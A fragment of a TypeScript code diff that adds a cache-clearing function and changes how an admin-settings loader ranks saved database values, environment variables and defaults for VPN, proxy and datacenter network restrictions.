+ * Clear settings cache (force reload from disk on next access)
+ */
+export function clearSettingsCache(): void {
+  settingsCache = null
+  cacheTimestamp = 0
+  console.log('[ADMIN SETTINGS] 🗑️  Cache cleared')
 }
 
 /**
@@ -668,20 +1092,17 @@ async function getAdminSettingsSql(): Promise<AdminSettings> {
           ...row.security?.gates,
         },
         networkRestrictions: {
-          ...DEFAULT_SETTINGS.security.networkRestrictions,
-          ...row.security?.networkRestrictions,
-          // IMPORTANT: Database settings take precedence over env vars
-          // Priority: Database value > Env var > Default
-          // This allows admin UI toggles to work properly
-          allowVpn: row.security?.networkRestrictions?.allowVpn !== undefined
+          // CRITICAL: Admin settings ALWAYS take precedence over .env
+          // Priority: Admin saved value > .env > Default
+          allowVpn: row.security?.networkRestrictions?.allowVpn !== undefined && row.security?.networkRestrictions?.allowVpn !== null
             ? row.security.networkRestrictions.allowVpn
-            : (process.env.ALLOW_VPN ? (process.env.ALLOW_VPN === '1' || process.env.ALLOW_VPN === 'true') : DEFAULT_SETTINGS.security.networkRestrictions.allowVpn),
-          allowProxy: row.security?.networkRestrictions?.allowProxy !== undefined
+            : (process.env.ALLOW_VPN === '1' || process.env.ALLOW_VPN === 'true' ? true : (process.env.ALLOW_VPN === '0' || process.env.ALLOW_VPN === 'false' ? false : DEFAULT_SETTINGS.security.networkRestrictions.allowVpn)),
+          allowProxy: row.security?.networkRestrictions?.allowProxy !== undefined && row.security?.networkRestrictions?.allowProxy !== null
             ? row.security.networkRestrictions.allowProxy
-            : (process.env.ALLOW_PROXY ? (process.env.ALLOW_PROXY === '1' || process.env.ALLOW_PROXY === 'true') : DEFAULT_SETTINGS.security.networkRestrictions.allowProxy),
-          allowDatacenter: row.security?.networkRestrictions?.allowDatacenter !== undefined
+            : (process.env.ALLOW_PROXY === '1' || process.env.ALLOW_PROXY === 'true' ? true : (process.env.ALLOW_PROXY === '0' || process.env.ALLOW_PROXY === 'false' ? false : DEFAULT_SETTINGS.security.networkRestrictions.allowProxy)),
+          allowDatacenter: row.security?.networkRestrictions?.allowDatacenter !== undefined && row.security?.networkRestrictions?.allowDatacenter !== null
             ? row.security.networkRestrictions.allowDatacenter
-            : (process.env.ALLOW_DATACENTER ? (process.env.ALLOW_DATACENTER === '1' || process.env.ALLOW_DATACENTER === 'true') : DEFAULT_SETTINGS.security.networkRestrictions.allowDatacenter),
+            : (process.env.ALLOW_DATACENTER === '1' || process.env.ALLOW_DATACENTER === 'true' ? true : (process.env.ALLOW_DATACENTER === '0' || process.env.ALLOW_DATACENTER === 'false' ? false : DEFAULT_SETTINGS.security.networkRestrictions.allowDatacenter)),
         },
         // Fallback to env var if saved value is undefined/null
         securityMode: row.security?.securityMode ?? (process.env.LINK_SECURITY_MODE === 'hardened' ? 'hardened' : 'strict') as 'strict' | 'hardened',
